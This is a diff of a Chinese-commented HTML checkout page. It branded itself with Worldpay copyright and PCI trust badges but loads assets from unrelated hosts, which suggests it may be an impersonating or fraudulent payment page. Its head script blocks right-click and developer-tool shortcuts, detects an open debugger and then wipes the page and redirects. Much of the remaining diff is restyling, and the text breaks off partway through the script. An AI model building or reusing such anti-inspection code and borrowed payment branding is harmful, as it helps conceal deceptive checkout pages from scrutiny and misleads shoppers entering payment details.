@@ -2,18 +2,25 @@
 <html lang="zh-CN">
 
 <head>
-  <!-- 安全防护：禁止右键、禁止F12、打开调试器自动跳转/白屏 -->
-<script type="text/javascript">
+  <!-- 
+    ============================================================================
+    SECURITY LAYER: ANTI-DEVTOOLS & CONTEXT MENU PROTECTION
+    ============================================================================
+  -->
+  <script type="text/javascript">
+    /**
+     * 安全防护脚本：禁止右键、禁止快捷键打开开发者工具。
+     * 当检测到调试环境时，自动清空页面并重定向。
+     */
     (function () {
-      // 1. 保留：禁止右键菜单 (防止用户点击“检查”)
-      document.addEventListener('contextmenu', e => e.preventDefault());
+      // 1. 禁止右键菜单 (防止用户通过右键点击“检查”)
+      document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+      });
 
-      // --- 已移除 selectstart 和 copy 的阻止逻辑 ---
-      // 现在允许用户使用快捷键 (Ctrl+C / Ctrl+V) 复制粘贴，并允许拖动选择文本
-      // 注意：由于禁用了右键，粘贴需通过键盘快捷键完成
-
-      // 2. 保留：禁止快捷键打开开发者工具 (F12, Ctrl+Shift+I, Ctrl+U 等)
+      // 2. 禁止常用的开发者工具快捷键
       document.onkeydown = function (e) {
+        // F12 (123), Ctrl+Shift+I (73), Ctrl+Shift+J (74), Ctrl+U (85), Ctrl+S (83)
         if (e.keyCode === 123 || 
           (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
           (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) || 
@@ -22,37 +29,58 @@
         }
       };
 
+      /**
+       * 销毁页面函数：清空内容并跳转空白页
+       */
       function killPage() {
         document.body.innerHTML = "";
         window.location.replace('about:blank');
       }
 
+      /**
+       * 调试检测逻辑：根据窗口内外宽度差以及 debugger 响应时间判断
+       */
       function detectDevTools() {
         const isRealMobile = /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
         if (!isRealMobile) {
           const threshold = 160;
           const widthDiff = window.outerWidth - window.innerWidth > threshold;
           const heightDiff = window.outerHeight - window.innerHeight > threshold;
-          if (widthDiff || heightDiff) { killPage(); return true; }
+          if (widthDiff || heightDiff) { 
+            killPage(); 
+            return true; 
+          }
         }
+        
+        // 基于时间差的 debugger 检测
         const start = performance.now();
         debugger;
         const end = performance.now();
-        if (end - start > 50) { killPage(); return true; }
+        if (end - start > 50) { 
+          killPage(); 
+          return true; 
+        }
         return false;
       }
       
+      // 定时轮询检测
       setInterval(detectDevTools, 1000);
       window.addEventListener('resize', detectDevTools);
       window.addEventListener('load', detectDevTools);
     })();
   </script>
-  <!-- 结束安全防护：禁止右键、禁止F12、打开调试器自动跳转/白屏 -->
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
   <title>Checkout - Secure Payment Gateway</title>
+
+  <!-- 
+    ============================================================================
+    CSS STYLING: BEAUTIFIED & EXPANDED
+    ============================================================================
+  -->
   <style>
-    /* === 基础重置 === */
+    /* === 基础全局重置 === */
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #fff;
@@ -60,12 +88,14 @@
       margin: 0;
       padding: 0;
       -webkit-font-smoothing: antialiased;
+      line-height: 1.5;
     }
 
     * {
       box-sizing: border-box;
     }
 
+    /* === 响应式主容器 === */
     .main-container {
       display: flex;
       flex-wrap: wrap;
@@ -74,7 +104,7 @@
       min-height: 100vh;
     }
 
-    /* === 左侧表单区域 === */
+    /* === 左侧：表单输入区域 === */
     .form-section {
       flex: 1.2;
       padding: 40px;
@@ -89,6 +119,7 @@
       margin: 35px 0 15px 0;
       padding-bottom: 10px;
       color: #333;
+      text-transform: none;
     }
 
     .section-title:first-child {
@@ -104,6 +135,7 @@
     .input-box {
       flex: 1;
       margin-bottom: 12px;
+      position: relative;
     }
 
     label.field-label {
@@ -121,19 +153,23 @@
       border: 1px solid #d9d9d9;
       border-radius: 5px;
       font-size: 14px;
-      transition: all 0.2s;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
       background: #fff;
       color: #333;
+      outline: none;
     }
 
     input:focus,
     select:focus {
       border-color: #2b5ef8;
-      outline: none;
       box-shadow: 0 0 0 1px #2b5ef8;
     }
 
-    /* === 支付方式列表 === */
+    input::placeholder {
+      color: #999;
+    }
+
+    /* === 支付方式列表样式 === */
     .payment-list {
       display: flex;
       flex-direction: column;
@@ -150,17 +186,18 @@
       border-left: 5px solid transparent;
       border-radius: 4px;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.25s ease;
       position: relative;
     }
 
     .payment-option:hover {
-      background: #e9e9e9;
+      background: #ededed;
     }
 
     .payment-option.selected {
       background-color: #F9FDFA;
-      border-left-color: #2b5ef8;
+      border: 1px solid #e1e1e1;
+      border-left: 5px solid #2b5ef8;
     }
 
     .payment-option input[type="radio"] {
@@ -188,7 +225,7 @@
       image-rendering: -webkit-optimize-contrast;
     }
 
-    /* === 运费选择器 === */
+    /* === 运费选择区域 === */
     .shipping-method-item {
       display: flex;
       align-items: center;
@@ -197,11 +234,13 @@
       border-radius: 5px;
       margin-bottom: 10px;
       cursor: pointer;
+      transition: background 0.2s;
     }
 
     .shipping-method-item.selected {
       border-color: #2b5ef8;
       background-color: #f9fdfa;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
     }
 
     .shipping-method-item input {
@@ -210,7 +249,7 @@
       accent-color: #2b5ef8;
     }
 
-    /* === 摘要区域 === */
+    /* === 右侧：订单摘要区域 === */
     .summary-section {
       flex: 0.8;
       background: #fafafa;
@@ -219,6 +258,7 @@
       padding: 40px;
     }
 
+    /* 移动端摘要切换器 */
     .mobile-summary-toggle {
       display: none;
       background: #fafafa;
@@ -265,6 +305,7 @@
       display: block;
     }
 
+    /* 商品列表渲染 */
     .product-list {
       margin-bottom: 20px;
       margin-top: 10px;
@@ -335,8 +376,10 @@
       font-size: 14px;
       font-weight: 500;
       color: #333;
+      text-align: right;
     }
 
+    /* 金额行基础样式 */
     .summary-line {
       display: flex;
       justify-content: space-between;
@@ -345,6 +388,7 @@
       color: #555;
     }
 
+    /* 底部总计行 */
     .total-line {
       margin-top: 20px;
       padding-top: 20px;
@@ -357,6 +401,7 @@
     .total-label {
       font-size: 16px;
       font-weight: 500;
+      color: #333;
     }
 
     .total-price {
@@ -374,7 +419,7 @@
       vertical-align: middle;
     }
 
-    /* 按钮样式 */
+    /* 提交按钮样式 */
     button#submit-btn {
       width: 100%;
       padding: 18px;
@@ -386,6 +431,7 @@
       font-size: 16px;
       cursor: pointer;
       margin-top: 30px;
+      transition: background 0.3s ease;
     }
 
     button#submit-btn:hover {
@@ -397,7 +443,95 @@
       cursor: not-allowed;
     }
 
-    /* === 翻译选择器样式 (新增加) === */
+    /* === 优惠券输入与展示美化 === */
+    .discount-input-wrapper {
+      display: flex;
+      gap: 10px;
+      margin: 20px 0;
+    }
+
+    .discount-input-wrapper input {
+      flex: 1;
+      margin-bottom: 0 !important;
+    }
+
+    .btn-apply {
+      padding: 0 20px;
+      background: #f1f1f1;
+      border: 1px solid #d9d9d9;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: 500;
+      color: #333;
+      transition: all 0.2s;
+    }
+
+    .btn-apply:hover {
+      background: #e5e5e5;
+    }
+
+    /* 折扣行样式：显示优惠码标题 */
+    .discount-line-item {
+      display: none; /* 默认隐藏，JS 激活 */
+      justify-content: space-between;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .discount-detail-label {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .discount-code-tag {
+      font-size: 12px;
+      color: #717171;
+      margin-top: 2px;
+      display: flex;
+      align-items: center;
+    }
+
+    /* 产品划线价格与折扣标签 */
+    .price-original {
+      text-decoration: line-through;
+      color: #717171;
+      font-size: 12px;
+      margin-right: 5px;
+    }
+
+    .product-discount-badge {
+      display: flex;
+      align-items: center;
+      font-size: 11px;
+      color: #717171;
+      margin-top: 5px;
+      font-weight: 500;
+      text-transform: uppercase;
+    }
+
+    /* TOTAL SAVINGS 模块 */
+    .savings-summary-box {
+      margin-top: 15px;
+      padding: 12px;
+      background: #f4f4f4;
+      border: 1px solid #e1e1e1;
+      border-radius: 4px;
+      display: none; /* 默认隐藏 */
+      align-items: center;
+      font-weight: 600;
+      font-size: 15px;
+      color: #333;
+    }
+
+    .savings-summary-box svg {
+      width: 18px;
+      height: 18px;
+      margin-right: 10px;
+      fill: #333;
+    }
+
+    /* === 翻译选择器样式 === */
     .lang-switcher-wrapper {
       display: flex;
       align-items: center;
@@ -421,7 +555,7 @@
       padding-top: 15px;
     }
 
-    /* === 遮罩层 (保持 V56.0) === */
+    /* === 遮罩层加载动画 === */
     #wcr-a-payment-loader {
       position: fixed;
       top: 0;
@@ -438,53 +572,48 @@
 
     .wcr-a-loader-content {
       background: #ffffff;
-      padding: 30px 40px;
+      padding: 35px 45px;
       border-radius: 12px;
       box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
       display: flex;
       flex-direction: column;
       align-items: center;
       max-width: 90%;
-      width: 340px;
+      width: 350px;
       text-align: center;
     }
 
     .wcr-a-spinner {
-      width: 40px;
-      height: 40px;
+      width: 45px;
+      height: 45px;
       border: 3px solid #f3f3f3;
       border-top: 3px solid #2ecc71;
       border-radius: 50%;
-      animation: wcr-a-spin 0.3s linear infinite;
-      margin-bottom: 20px;
+      animation: wcr-a-spin 0.4s linear infinite;
+      margin-bottom: 25px;
+    }
+
+    @keyframes wcr-a-spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     .wcr-a-text {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-family: inherit;
       font-size: 16px;
       color: #333;
       font-weight: 500;
       line-height: 1.5;
     }
 
-    @keyframes wcr-a-spin {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    /* === 移动端适配 === */
+    /* === 移动端适配适配 === */
     @media (max-width: 900px) {
       .main-container {
         flex-direction: column-reverse;
       }
 
       .form-section {
-        padding: 20px;
+        padding: 25px;
         border-right: none;
       }
 
@@ -496,7 +625,7 @@
         position: sticky;
         top: 0;
         z-index: 999;
-        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
+        box-shadow: 0 4px 10px rgba(0,0,0,0.06);
       }
 
       .mobile-summary-toggle {
@@ -507,34 +636,15 @@
         display: none;
         padding: 20px;
         border-bottom: 1px solid #e1e1e1;
-        max-height: 60vh;
+        max-height: 70vh;
         overflow-y: auto;
       }
 
       .summary-content.show {
         display: block;
-        animation: slideDown 0.3s ease-out;
-      }
-
-      @keyframes slideDown {
-        from {
-          opacity: 0;
-          transform: translateY(-10px);
-        }
-
-        to {
-          opacity: 1;
-          transform: translateY(0);
-        }
       }
 
       .pc-lang-switcher {
-        display: none;
-      }
-    }
-
-    @media (min-width: 901px) {
-      .mobile-lang-switcher {
         display: none;
       }
     }
@@ -544,127 +654,24 @@
       justify-content: center;
       align-items: center;
       gap: 25px;
-      margin-top: 20px;
-      margin-bottom: 10px;
+      margin-top: 25px;
+      margin-bottom: 15px;
     }
 
     .trust-badges img {
-      height: 40px;
+      height: 38px;
       width: auto;
-      object-fit: contain;
-      opacity: 0.9;
-      transition: opacity 0.2s;
+      opacity: 0.85;
     }
-
-    .trust-badges img:hover {
-      opacity: 1;
-    }
-
-/* ============================================================
-   优惠券与自动折扣增强样式 (包含第一步和第二步的所有样式)
-   ============================================================ */
-
-/* 1. 优惠券输入框区域 */
-.discount-input-wrapper {
-  display: flex;
-  gap: 10px;
-  margin: 20px 0;
-}
-.discount-input-wrapper input {
-  flex: 1;
-  margin-bottom: 0 !important; /* 强制对齐 */
-}
-.btn-apply {
-  padding: 0 20px;
-  background: #f1f1f1;
-  border: 1px solid #d9d9d9;
-  border-radius: 5px;
-  cursor: pointer;
-  font-weight: 500;
-  color: #333;
-  transition: background 0.2s;
-}
-.btn-apply:hover { background: #e5e5e5; }
-
-/* 2. 已应用的优惠券标签 (带 X 号) */
-.applied-coupon-tag {
-  display: inline-flex;
-  align-items: center;
-  background: #f1f1f1;
-  padding: 6px 10px;
-  border-radius: 4px;
-  font-size: 13px;
-  color: #333;
-  margin-bottom: 15px;
-}
-.coupon-icon {
-  margin-right: 6px;
-  width: 14px;
-  height: 14px;
-  fill: #717171;
-}
-.remove-coupon {
-  margin-left: 8px;
-  cursor: pointer;
-  color: #717171;
-  font-weight: bold;
-}
-
-/* 3. 商品价格划线与高亮 (还原 Shopify 效果) */
-.price-original {
-  text-decoration: line-through;
-  color: #717171;
-  font-size: 12px;
-  margin-right: 5px;
-}
-.price-current {
-  color: #333;
-  font-weight: 600;
-}
-
-/* 4. 商品名称下方的折扣详情小标签 */
-.product-discount-badge {
-  display: flex;
-  align-items: center;
-  font-size: 12px;
-  color: #717171;
-  margin-top: 5px;
-  text-transform: uppercase;
-  font-weight: 500;
-}
-.product-discount-badge svg {
-  width: 14px;
-  height: 14px;
-  fill: #717171;
-  margin-right: 4px;
-}
-
-/* 5. 底部总节省 (TOTAL SAVINGS) 区域 */
-.savings-summary {
-  margin-top: 15px;
-  padding: 10px 0;
-  display: none; /* 有优惠时由 JS 控制显示 */
-  align-items: center;
-  font-weight: 600;
-  font-size: 15px;
-  color: #333;
-}
-.savings-summary svg {
-  width: 18px;
-  height: 18px;
-  margin-right: 8px;
-}
-
-
   </style>
 </head>
 
 <body>
 
   <div class="main-container">
-    <!-- 左侧输入表单 -->
+    <!-- LEFT: CHECKOUT FORM SECTION -->
     <div class="form-section">
-      <!-- 移动端：翻译按钮在最顶端 -->
+      <!-- MOBILE LANGUAGE SELECTOR -->
       <div class="lang-switcher-wrapper mobile-lang-switcher">
         <select class="lang-selector">
           <option value="en">English</option>
@@ -675,6 +682,7 @@
       </div>
 
       <form id="payment-form">
+        <!-- CONTACT INFO -->
         <div class="section-title" data-i18n="title_contact">Contact</div>
         <div class="input-box">
           <label class="field-label" data-i18n="label_email">Email Address</label>
@@ -682,9 +690,10 @@
         </div>
         <div class="input-box">
           <label class="field-label" data-i18n="label_phone">Phone</label>
-          <input type="tel" id="phone" required placeholder="Phone">
+          <input type="tel" id="phone" required placeholder="Phone number">
         </div>
 
+        <!-- SHIPPING INFO -->
         <div class="section-title" data-i18n="title_shipping">Shipping Address</div>
         <div class="input-box">
           <label class="field-label" data-i18n="label_country">Country/Region</label>
@@ -724,11 +733,13 @@
           </div>
         </div>
 
+        <!-- SHIPPING METHODS -->
         <div id="shipping-method-area" style="display:none;">
           <div class="section-title" data-i18n="title_shipping_method">Shipping Method</div>
           <div id="shipping-rates-list"></div>
         </div>
 
+        <!-- PAYMENT METHODS -->
         <div class="section-title" data-i18n="title_payment">Payment Method</div>
         <div id="payment-container" class="payment-list">
           <div style="padding:15px; color:#666; font-size:14px;">Loading payment options...</div>
@@ -737,66 +748,65 @@
 
         <button type="submit" id="submit-btn" data-i18n="btn_place_order">PLACE ORDER</button>
 
+        <!-- TRUST BADGES -->
         <div class="trust-badges">
           <img src="https://image.defitopay.com/worldgate.svg" alt="Secured by WorldGate">
           <img src="https://image.defitopay.com/pci.svg" alt="PCI DSS Compliant">
         </div>
 
-        <div
-          style="margin-top:12px; text-align: center; font-weight: bold; font-size: 11px; color:#bbb; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
+        <div style="margin-top:20px; text-align: center; font-weight: bold; font-size: 11px; color:#bbb;">
           Copyright 2026 Worldpay LLC, and its affiliates.
         </div>
       </form>
     </div>
 
-    <!-- 右侧订单摘要 -->
+    <!-- RIGHT: ORDER SUMMARY SECTION -->
     <div class="summary-section">
+      <!-- MOBILE TOGGLE BAR -->
       <div class="mobile-summary-toggle" id="summaryToggle">
         <div class="toggle-left">
           <svg viewBox="0 0 20 20">
-            <path
-              d="M17.178 13.088H5.453c-.454 0-.91-.364-.908-.82l.148-4.408c.002-.455.463-.82.914-.82h11.569c.454 0 .91.364.908.82l-.148 4.408c-.002.455-.463.82-.914.82zm3.427-12.35l-1.659 7.902c-.244 1.163-1.554 2.14-2.84 2.14l-1.07.001c-.002.502-.005 1.004-.007 1.505 0 1.256-1.015 2.275-2.268 2.275-1.252 0-2.268-1.02-2.268-2.275 0-.501.005-1.003.007-1.505l-3.32.003c.003.502.006 1.004.008 1.505 0 1.256-1.015 2.275-2.268 2.275-1.252 0-2.268-1.02-2.268-2.275 0-.501.004-1.003.007-1.505L.804 5.672C.555 4.54.167 2.663.072 2.185.02 1.926-.01 1.696.002 1.507.037.95.342.602.83.602h2.23c.84 0 1.631.542 1.928 1.32L5.89 4.39c.603 0 1.206-.002 1.808-.002V2.85c0-1.57 1.27-2.848 2.835-2.848 1.566 0 2.836 1.278 2.836 2.849v1.538c.602 0 1.204.002 1.806.002l.745-2.12c.26-.74.966-1.268 1.76-1.268h2.09c.49 0 .807.36.852.92.02.247.01.536-.068.818zM11.69 2.85c0-.907-.733-1.642-1.637-1.642-.903 0-1.637.735-1.637 1.642v1.54h3.273V2.85z">
-            </path>
+            <path d="M17.178 13.088H5.453c-.454 0-.91-.364-.908-.82l.148-4.408c.002-.455.463-.82.914-.82h11.569c.454 0 .91.364.908.82l-.148 4.408c-.002.455-.463.82-.914.82zm3.427-12.35l-1.659 7.902c-.244 1.163-1.554 2.14-2.84 2.14l-1.07.001c-.002.502-.005 1.004-.007 1.505 0 1.256-1.015 2.275-2.268 2.275-1.252 0-2.268-1.02-2.268-2.275 0-.501.005-1.003.007-1.505l-3.32.003c.003.502.006 1.004.008 1.505 0 1.256-1.015 2.275-2.268 2.275-1.252 0-2.268-1.02-2.268-2.275 0-.501.004-1.003.007-1.505L.804 5.672C.555 4.54.167 2.663.072 2.185.02 1.926-.01 1.696.002 1.507.037.95.342.602.83.602h2.23c.84 0 1.631.542 1.928 1.32L5.89 4.39c.603 0 1.206-.002 1.808-.002V2.85c0-1.57 1.27-2.848 2.835-2.848 1.566 0 2.836 1.278 2.836 2.849v1.538c.602 0 1.204.002 1.806.002l.745-2.12c.26-.74.966-1.268 1.76-1.268h2.09c.49 0 .807.36.852.92.02.247.01.536-.068.818zM11.69 2.85c0-.907-.733-1.642-1.637-1.642-.903 0-1.637.735-1.637 1.642v1.54h3.273V2.85z"></path>
           </svg>
           <span id="toggleText" data-i18n="toggle_show">Show order summary</span>
-          <svg class="toggle-chevron" viewBox="0 0 10 7"
-            style="width:10px; height:7px; fill:none; stroke:#197bbd; stroke-width:2px;">
+          <svg class="toggle-chevron" viewBox="0 0 10 7" style="width:10px; height:7px; fill:none; stroke:#197bbd; stroke-width:2px; margin-left: 6px;">
             <path d="M1 1L5 5L9 1" stroke-linecap="round" stroke-linejoin="round" />
           </svg>
         </div>
         <div class="toggle-total" id="mobile-total-display">$0.00</div>
       </div>
 
+      <!-- MAIN SUMMARY CONTENT -->
       <div class="summary-content" id="summaryContent">
         <div id="product-list" class="product-list"></div>
-        <!-- 1. 优惠券输入框 -->
+
+        <!-- DISCOUNT INPUT BOX -->
         <div class="discount-input-wrapper">
           <input type="text" id="coupon-input" placeholder="Discount code or gift card">
           <button type="button" class="btn-apply" id="apply-coupon-btn" onclick="applyDiscount()">Apply</button>
         </div>
 
-        <!-- 2. 已应用标签 -->
-        <div id="coupon-tag-area" style="display:none;">
-           <div class="applied-coupon-tag">
-             <svg class="coupon-icon" viewBox="0 0 16 16"><path d="M16 8c0 .28-.22.5-.5.5h-2.1c-.28 0-.5-.22-.5-.5s.22-.5.5-.5h2.1c.28 0 .5.22.5.5zm-5.41-3.41L12 3.17c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0L9.88 3.88c-.2.2-.2.51 0 .71.2.2.51.2.71 0zM4 12h8v2H4v-2zm0-3h8v2H4V9zm0-3h8v2H4V6zm10.71-3.71c-.2-.2-.51-.2-.71 0L12.59 3.7c-.2.2-.2.51 0 .71.2.2.51.2.71 0l1.41-1.41c.2-.2.2-.51 0-.71zM15 8c0-3.87-3.13-7-7-7S1 4.13 1 8s3.13 7 7 7 7-3.13 7-7zM8 2c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z"/></svg>
-             <span id="applied-code-text">TEST888</span>
-             <span class="remove-coupon" onclick="removeDiscount()">✕</span>
-           </div>
+        <!-- FEES SUMMARY -->
+        <div class="summary-line">
+          <span data-i18n="summary_subtotal">Subtotal</span>
+          <span id="subtotal-val">0.00</span>
         </div>
-
-        <div class="summary-line"><span data-i18n="summary_subtotal">Subtotal</span><span id="subtotal-val">0.00</span></div>
         
-        <!-- 3. 折扣行 -->
-        <div class="summary-line discount-line" id="discount-row">
-          <div style="display:flex; flex-direction:column;">
+        <!-- DYNAMIC DISCOUNT ROW -->
+        <div class="discount-line-item" id="discount-row">
+          <div class="discount-detail-label">
             <span>Order discount</span>
-            <span style="font-size:12px; color:#717171;" id="discount-detail-text"></span>
+            <span id="discount-detail-text" class="discount-code-tag"></span>
           </div>
           <span id="discount-val">- 0.00</span>
         </div>
 
-        <div class="summary-line"><span data-i18n="summary_shipping">Shipping</span><span id="shipping-display" data-i18n="summary_calc">Calculated at next step</span></div>
+        <div class="summary-line">
+          <span data-i18n="summary_shipping">Shipping</span>
+          <span id="shipping-display" data-i18n="summary_calc">Calculated at next step</span>
+        </div>
         
+        <!-- FINAL TOTAL -->
         <div class="total-line">
           <span class="total-label" data-i18n="summary_total">Total</span>
           <div style="display:flex; align-items:baseline;">
@@ -805,13 +815,13 @@
           </div>
         </div>
 
-        <!-- 4. Total Savings 模块 -->
-        <div class="savings-box" id="savings-box">
+        <!-- TOTAL SAVINGS MODULE -->
+        <div class="savings-summary-box" id="savings-summary-box">
           <svg viewBox="0 0 16 16"><path d="M16 8c0 .28-.22.5-.5.5h-2.1c-.28 0-.5-.22-.5-.5s.22-.5.5-.5h2.1c.28 0 .5.22.5.5zm-5.41-3.41L12 3.17c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0L9.88 3.88c-.2.2-.2.51 0 .71.2.2.51.2.71 0zM4 12h8v2H4v-2zm0-3h8v2H4V9zm0-3h8v2H4V6zm10.71-3.71c-.2-.2-.51-.2-.71 0L12.59 3.7c-.2.2-.2.51 0 .71.2.2.51.2.71 0l1.41-1.41c.2-.2.2-.51 0-.71zM15 8c0-3.87-3.13-7-7-7S1 4.13 1 8s3.13 7 7 7 7-3.13 7-7zM8 2c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z"/></svg>
-          <span>TOTAL SAVINGS  <span id="savings-val">0.00</span></span>
+          <span>TOTAL SAVINGS <span id="total-savings-val">0.00</span></span>
         </div>
 
-        <!-- PC端：翻译按钮在摘要最下方 -->
+        <!-- PC LANGUAGE SWITCHER -->
         <div class="lang-switcher-wrapper pc-lang-switcher">
           <select class="lang-selector">
             <option value="en">English</option>
@@ -824,258 +834,124 @@
     </div>
   </div>
 
+  <!-- LOADER MASK -->
   <div id="wcr-a-payment-loader">
     <div class="wcr-a-loader-content">
       <div class="wcr-a-spinner"></div>
       <div class="wcr-a-text">
         <div class="main-msg" data-i18n="mask_main">Securely launching payment</div>
-        <div class="sub-msg" style="font-size: 14px; color: #2ecc71; font-weight: normal;" data-i18n="mask_sub">
+        <div class="sub-msg" style="font-size: 14px; color: #2ecc71; font-weight: normal; margin-top: 5px;" data-i18n="mask_sub">
           Please do not exit or close this window
         </div>
       </div>
     </div>
   </div>
 
+  <!-- 
+    ============================================================================
+    JAVASCRIPT: CORE LOGIC & API INTERACTION
+    ============================================================================
+  -->
   <script>
-    // ==========================================
-    // 多语言核心逻辑 (新增加)
-    // ==========================================
-    async function applyLanguage(lang) {
-      const CLOUDFLARE_BASE_URL = 'https://worldpay-shopify-to-wordpress-ant-live.pages.dev'; 
-      
-      try {
-        const cacheBuster = new Date().getTime();
-        const url = `${CLOUDFLARE_BASE_URL}/translate/${lang}.json?v=${cacheBuster}`;
-        
-        const res = await fetch(url);
-        if (!res.ok) return;
-
-        const trans = await res.json();
-
-        // 1. 翻译带有 data-i18n 属性的文本
-        document.querySelectorAll('[data-i18n]').forEach(el => {
-          const key = el.getAttribute('data-i18n');
-          if (trans[key]) el.textContent = trans[key];
-        });
-
-        // 2. 翻译输入框提示 (Placeholder)
-        const placeholders = {
-          'email': 'placeholder_email',
-          'address': 'placeholder_address',
-          'phone': 'placeholder_phone'
-        };
-        for (let id in placeholders) {
-          const el = document.getElementById(id);
-          if (el && trans[placeholders[id]]) el.placeholder = trans[placeholders[id]];
-        }
-
-        // 3. 同步所有下拉选择器的状态并保存偏好
-        document.querySelectorAll('.lang-selector').forEach(s => s.value = lang);
-        localStorage.setItem('preferred_lang', lang);
-
-      } catch (e) {
-        // 生产环境仅保留必要的错误记录，不打印调试信息
-        console.error('i18n error');
-      }
-    }
-
     /**
-     * 绑定下拉框切换事件
+     * GLOBAL STATE & CONFIG
      */
-    function bindLangEvents() {
-      document.querySelectorAll('.lang-selector').forEach(select => {
-        select.onchange = (e) => applyLanguage(e.target.value);
-      });
-    }
-
-    /**
-     * 页面加载初始化
-     */
-    window.addEventListener('DOMContentLoaded', () => {
-      bindLangEvents();
-
-      const saved = localStorage.getItem('preferred_lang');
-      const browser = navigator.language.split('-')[0];
-      
-      // 优先级：手动选择 > 浏览器识别 > 英语
-      const target = saved || (browser === 'zh' ? 'zh-TW' : (['ja','ko'].includes(browser) ? browser : 'en'));
-      
-      applyLanguage(target);
-    });
-
-// === 优惠券全局状态 ===
-    let currentDiscount = {
-      code: "",
-      type: "none", // percentage, fixed_amount, buy_x_get_y
-      value: 0,
-      amount: 0
-    };
-
-    // 模拟从后台同步的优惠券配置信息 (实际应用中你可以通过 fetch 调用后台接口获取)
-    async function validateCouponFromBackend(code) {
-      // 此处演示逻辑：你可以根据代码前缀模拟不同场景
-      // 场景1：固定比例 (TEST10 -> 10% off)
-      if (code.toUpperCase().startsWith("TEST10")) return { type: "percentage", value: 0.1, code: code.toUpperCase() };
-      // 场景2：固定金额 (SAVE5 -> 减5元)
-      if (code.toUpperCase().startsWith("SAVE5")) return { type: "fixed_amount", value: 5.0, code: code.toUpperCase() };
-      // 场景3：满减/满件 (满2件打9折)
-      if (code.toUpperCase().startsWith("BUY2")) return { type: "buy_x_min", min_qty: 2, value: 0.1, code: code.toUpperCase() };
-      
-      // 默认通配
-      if (code.length >= 3) return { type: "percentage", value: 0.1, code: code.toUpperCase() }; 
-      return null;
-    }
-
-    // 处理手动输入优惠券：通过 Shopify 路径应用，由 Shopify 后台校验
-    window.applyDiscount = async function() {
-      const code = document.getElementById('coupon-input').value.trim();
-      if (!code) return;
-
-      const btn = document.getElementById('apply-coupon-btn');
-      btn.innerText = "Checking...";
-
-      try {
-        // 关键：将优惠券发送到 Shopify 的折扣处理接口
-        // 这会让 Shopify 后台执行冲突检查（自动折扣 vs 优惠码）
-        await fetch(`/discount/${code}`);
-        
-        // 重新加载购物车数据，看看 Shopify 后台最终决定应用哪个折扣
-        await loadCartData();
-        
-        document.getElementById('coupon-input').value = "";
-      } catch (e) {
-        alert("Apply discount failed");
-      } finally {
-        btn.innerText = "Apply";
-      }
-    };
-
-
-    window.removeDiscount = function() {
-      currentDiscount = { code: "", type: "none", value: 0, amount: 0 };
-      document.getElementById('coupon-tag-area').style.display = 'none';
-      document.getElementById('discount-row').style.display = 'none';
-      document.getElementById('savings-box').style.display = 'none';
-      updateTotalDisplay();
-    };
-
-    // ==========================================
-    // V56.0 原始功能逻辑 (保持不变)
-    // ==========================================
-    function showWcrLoading() { document.getElementById('wcr-a-payment-loader').style.display = 'flex'; }
-    function hideWcrLoading() { document.getElementById('wcr-a-payment-loader').style.display = 'none'; }
+    let currentCart = null;
+    let selectedShippingRate = null;
+    let availableShippingRates = [];
+    let currentAppliedDiscounts = [];
 
     const shopifyOption = { id: 'shopify_checkout', name: 'Shopify Secure Checkout', icon: 'https://image.defitopay.com/global_pay.svg' };
+    
     const currencyPaymentMap = {
       'USD': [shopifyOption],
       'JPY': [{ id: 'paypay', name: 'PayPay', icon: 'https://image.defitopay.com/paypay.svg' }, 
               { id: 'aupay', name: 'au Pay', icon: 'https://image.defitopay.com/aupay.svg' }, shopifyOption],
       'KRW': [{ id: 'kakaopay', name: 'KakaoPay', icon: 'https://image.defitopay.com/kakaopay.png' }, 
               { id: 'tosspay', name: 'Toss Pay', icon: 'https://image.defitopay.com/tosspay.png' }, 
-              { id: 'naverpay', name: 'Naver Pay', icon: 'https://image.defitopay.com/naverpay.png' }, 
-              { id: 'payco', name: 'Naver Pay', icon: 'https://image.defitopay.com/payco.png' }, shopifyOption],
+              { id: 'naverpay', name: 'Naver Pay', icon: 'https://image.defitopay.com/naverpay.png' }, shopifyOption],
       'TWD': [{ id: 'jkopay', name: 'JKOPay', icon: 'https://image.defitopay.com/tw_jkopay.png' }, shopifyOption],
-      'CNY': [shopifyOption],
       'DEFAULT': [shopifyOption]
     };
 
-    const allCountries = [{ code: "US", name: "United States" }, { code: "JP", name: "日本国" }, { code: "KR", name: "대한민국" }, { code: "TW", name: "Taiwan" }, { code: "HK", name: "Hong Kong" }, { code: "SG", name: "Singapore" }, { code: "MY", name: "Malaysia" }, { code: "GB", name: "United Kingdom" }, { code: "CA", name: "Canada" }, { code: "AU", name: "Australia" }];
-    let currentCart = null, availableShippingRates = [], selectedShippingRate = null;
+    const allCountries = [
+      { code: "US", name: "United States" }, 
+      { code: "JP", name: "日本国" }, 
+      { code: "KR", name: "대한민국" }, 
+      { code: "TW", name: "Taiwan" }, 
+      { code: "HK", name: "Hong Kong" }, 
+      { code: "GB", name: "United Kingdom" }, 
